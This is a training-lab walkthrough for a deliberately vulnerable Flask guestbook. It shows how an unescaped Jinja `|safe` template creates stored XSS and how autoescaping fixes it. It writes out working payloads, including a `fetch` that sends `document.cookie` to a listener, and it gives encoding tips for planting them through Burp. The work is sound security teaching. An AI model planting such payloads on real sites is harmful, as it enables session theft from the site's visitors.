# Walkthrough — xss-stored

## 1. Context

The app is a guestbook. On `/` you see every comment left so far — newest first, each line showing the author, a date, and the message — with a small form at the top to leave your own. Submitting the form sends a `POST /comment`; the server saves the comment to a SQLite `comments` table and redirects you back to `GET /` (the Post/Redirect/Get pattern), where your new comment now appears in the list alongside everyone else's.

Two seed comments ship with the lab (from `alice` and `bob`, dated a few days apart) so the page looks like a guestbook with history rather than an empty form.

One more thing happens on every `GET /`: the server sets a cookie, `session=fake-session-token-abc123`. It authenticates nothing — it is a lab prop — but it is a real cookie in your browser, and it is **not** `HttpOnly`, which matters in Step 3.

> **A note on what you'll observe, and where.** Unlike the SQLi atoms, this one is not worked entirely in Burp. Burp cannot execute JavaScript, and stored XSS only *proves itself* when a script runs in a browser. So the exploitation below uses two tools, and the split is not incidental — it mirrors the attack itself: **Burp plants** the payload (the attacker's move) and a **browser observes** it firing (the victim's move). Attacker and victim are different parties, in different requests, at different times — that is the whole idea of stored XSS, and you feel it in the tooling.

## 2. Spot the bug

The source and the sink are in different files — and, unlike reflected XSS, in different *requests*. The `POST /comment` view in [`vulnerable/app.py`](./vulnerable/app.py) stores the comment:

```python
@app.route("/comment", methods=["POST"])
def comment():
    author = request.form.get("author", "")
    body = request.form.get("body", "")
    conn = sqlite3.connect(DB_PATH)
    # Parameterized insert: storing the payload is NOT the bug (no SQLi here).
    conn.execute("INSERT INTO comments (author, body) VALUES (?, ?)", (author, body))
    ...
```

Note the `?` placeholders: the insert is parameterized, so there is **no SQL injection** here. The payload is stored *safely*. The bug is not how the data goes in — it's how it comes back out. The sink is one file over, in [`vulnerable/templates/index.html`](./vulnerable/templates/index.html), in the loop that renders the saved comments:

```html
<li><strong>{{ comment.author }}</strong> &middot; {{ comment.created_at }} &mdash; {{ comment.body|safe }}</li>
```

`{{ comment.body }}` on its own would be safe — Jinja autoescapes by default, turning `<`, `>`, `&`, `'`, and `"` into HTML entities before they reach the response. The `|safe` filter explicitly turns that off for the body, telling Jinja "this is already trusted HTML, emit it verbatim." It isn't: it came from `request.form` in a different request and has been sitting in the database ever since. The `author` and `created_at` beside it are rendered plainly (escaped) — the body is the only sink.

Same lessons as `xss-reflected`, sharpened:

- The source (`app.py`, the `POST`) and the sink (`index.html`, the `GET`) are in different files **and different requests**. A review reading only the write path sees a clean parameterized insert and moves on.
- `|safe` is the red flag. `grep -rn '|safe' templates/` is the cheap first-pass audit, here as there.
- The data is stored fine — it's the *output* that's unescaped. Stored XSS lives at the render, not the write.

## 3. Exploitation via Burp Suite + browser (primary track)

Configure Burp Proxy, point your browser at it, and visit <http://127.0.0.1:8008/>. Submit one throwaway comment through the form so Burp captures a `POST /comment` in **Proxy → HTTP history**; right-click it and choose **Send to Repeater**. That POST is the attacker's instrument — you edit its body and re-send to plant payloads with full control over the exact bytes.

### A note on encoding the body

The `POST /comment` body is `application/x-www-form-urlencoded`: `author=<...>&body=<...>`. When you hand-edit it in Repeater, characters that are structural to that format must be encoded inside a value:

- `&` (`%26`) separates fields and `=` (`%3D`) separates key from value — a literal one inside your payload would be misparsed.
- **`+` must be `%2B`.** In a form-urlencoded body a literal `+` decodes to a *space*. The Step 3 payload contains `'+document.cookie`; sent raw, the server stores `' document.cookie` and the JavaScript breaks. This is the single most common reason a copy-pasted XSS payload silently fails in a POST body.

The `<`, `>`, `'`, `/` of an XSS payload are not form-structural and can travel as-is, but the safe habit is to paste the decoded payload into Repeater, select the value, and press **Ctrl+U** — Burp encodes everything, including the `+`. Each step shows a **Body (decoded)** for reading and a **Body (Burp-ready)** to paste. (Planting through the browser form instead — section 4 — encodes everything for you; the `+` trap only bites when you craft the raw body in Burp.)

### Step 1 — Plant once, fire elsewhere

This one step is the whole stored loop: the attacker plants in one request (1a), and a *different* request by a *different* person triggers it (1b).

**1a — plant the payload (attacker, in Burp).** In the Repeater `POST /comment`, set the body to a proof payload and send it.

Body (decoded):

```
author=mallory&body=<script>alert(document.domain)</script>
```

Body (Burp-ready):

```
author=mallory&body=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
```

The response is a **302 redirect** to `/`. Read that carefully: the attacker's own response is **inert** — no alert, nothing executes, the payload is not even echoed back. It went into storage. (Contrast `xss-reflected`, where the payload came straight back in the attacker's own response and would fire right there. Here the attacker's request is a dead drop.)

**1b — trigger it (victim, in the browser).** Now stop being the attacker. Open <http://127.0.0.1:8008/> in your browser as an ordinary visitor who never saw mallory's request.

The alert fires — `127.0.0.1:8008`. The script mallory *stored* is running in **your** browser, on a request **you** made, at a time **you** chose; the attacker is long gone. That gap — attacker plants, victim fires, different requests, different moments — is stored XSS in one screen.

Why the inline `<script>` runs: the server drops it into the **initial HTML** of `GET /`, which the browser parses top-to-bottom on load, executing inline script tags as it goes. (In DOM-based XSS — where the sink is client-side JavaScript writing into the DOM *after* load — browsers deliberately don't execute `<script>` inserted via `innerHTML`, and this same payload would silently do nothing. Same class, different sink; the payload has to match the sink.)

### Step 2 — Persistence: it fires for every visitor, every time

Don't post anything new. Just reload <http://127.0.0.1:8008/> — or open it in a second tab, or a different browser profile, standing in for a genuinely different visitor. The alert fires **again**, with no new request from the attacker.

This isolates what the bug actually is — and what it is *not*. Look at the URL: a bare `http://127.0.0.1:8008/`, no query string, nothing malicious in the request at all. Yet the script runs. So this is **not** a reflection — there is nothing in *your* request to reflect. The payload is coming from the **database**, re-served on every visit, to every visitor, indefinitely, until someone deletes the comment. Reflected XSS needs the victim to click an attacker-crafted link carrying the payload; stored XSS needs the victim to do nothing but visit a page they already trust.

### Step 3 — Real impact: steal the victim's cookie

An alert proves execution; it doesn't show impact. Swap the proof payload for one that exfiltrates the victim's session cookie to a server you control.

> **Set up a listener first.** In a separate terminal:
>
> ```bash
> python3 -m http.server 9000
> ```
>
> A one-line HTTP server to catch callbacks is a standard pentest tool, not just a lab trick — you'll reuse it for XSS, SSRF, LFI, and any blind/out-of-band injection where the data has to come back on a side channel. (If port 9000 is taken, use any free port and adjust the payload.)

**Plant the exfil payload (attacker, in Burp).**

Body (decoded):

```
author=mallory&body=<script>fetch('http://127.0.0.1:9000/?c='+document.cookie)</script>
```

Body (Burp-ready):

```
author=mallory&body=%3Cscript%3Efetch%28%27http%3A%2F%2F127.0.0.1%3A9000%2F%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E
```

(Mind the `%2B` — see the encoding note above. A raw `+` here becomes a space and the script breaks.)

**Trigger it (victim, in the browser).** With the listener running, open <http://127.0.0.1:8008/>. The page loads normally, and the stored script silently fires a `fetch` carrying `document.cookie`. In the listener terminal a log line appears:

```
127.0.0.1 - - [..] "GET /?c=session=fake-session-token-abc123 HTTP/1.1" 200 -
```

There it is — the victim's session cookie, delivered to the attacker's server. This ran in the **victim's** browser, not the attacker's; in a real engagement the host would be the attacker's box (`//attacker.example`), not localhost, and the attacker would replay that cookie to hijack the victim's session. (The payload stays demonstrative — read the cookie, send it, nothing destructive.)

Two things worth knowing, both reusable beyond this lab:

- **CORS doesn't stop the exfil.** The `fetch` is cross-origin (`:8008` → `:9000`), so the browser may block the attacker from *reading the response* — but the request still **leaves** the browser with the stolen data in its query string, and still lands in the listener log. Exfiltration-by-URL doesn't need the response, only the outbound request, so CORS is irrelevant to it.
- **No Mixed Content block.** The app is plain HTTP (no TLS), so a `fetch` to `http://127.0.0.1:9000` isn't blocked. From an HTTPS page the browser would block an `http://` request as mixed content, and you'd send to `https://` or a protocol-relative `//host` instead.

(By now the Step 1 alert is still stored and fires on each visit too — persistence, again. To reset to just the seed comments: `./atom down xss-stored && ./atom up xss-stored`.)

### Why this is stored, not reflected

In `xss-reflected` the payload rode in the query string of a single request and came back in that same response — the attacker saw their own alert, and a victim was only hit if they clicked an attacker-crafted link (social engineering). Here the attacker planted one `POST` and walked away; the payload lives in the database, and every visitor who opens the guestbook — clicking nothing — runs it, persistently. Same sink (`|safe`), same fix (autoescape), same class. Only the delivery changed: from an ephemeral echo in your own response to a persistent payload in everyone's. And what it steals is not server-side data the way SQLi exfiltrates a password — it's the victim's own session, out of their browser.

## 4. Exploitation via the browser alone (secondary track, optional)

If you haven't set up Burp yet, you can do the whole thing from the browser and still feel the impact:

1. On <http://127.0.0.1:8008/>, type any name and paste `<script>alert(document.domain)</script>` into the comment field, then submit. The browser form-encodes the body for you (including any `+`), so there's no encoding to think about.
2. You land back on `/` (the redirect) and the alert fires immediately — your freshly stored comment is already in the page.
3. Reload to see it fire again (persistence), and try the Step 3 `fetch(...)` payload with the listener running to watch the cookie arrive.

This is the low-friction first pass. Use Burp for the primary track when you want raw control over the planted bytes — which is how you'd work a real target.

## 5. Why the fix works

See [`DIFF.md`](./DIFF.md) for the one-line change. In short: the fixed template drops `|safe` and renders `{{ comment.body }}` through Jinja's default autoescape, so `<`, `>`, `&`, `'`, `"` become HTML entities at render time. Point your browser at the fixed app on **8108**, plant any payload from above, and reload: the comment shows up as visible text — `<script>alert(document.domain)</script>` printed on screen, angle brackets and all — and nothing executes. The listener stays silent.

The cookie is still set on 8108, and still not `HttpOnly` — because the cookie was never the bug, and keeping exactly one thing different between the two apps (the escaping) keeps the lesson clean. Setting `HttpOnly` would be worth doing as defense-in-depth — it would stop `document.cookie` from reading the session, defeating *this particular* exfil payload even if an XSS slipped through — but it is not the fix, and would not stop the XSS itself (the attacker could still deface the page, act as the user, or read the DOM). The fix is escaping the output; [`DIFF.md`](./DIFF.md) covers the HttpOnly layer in full.
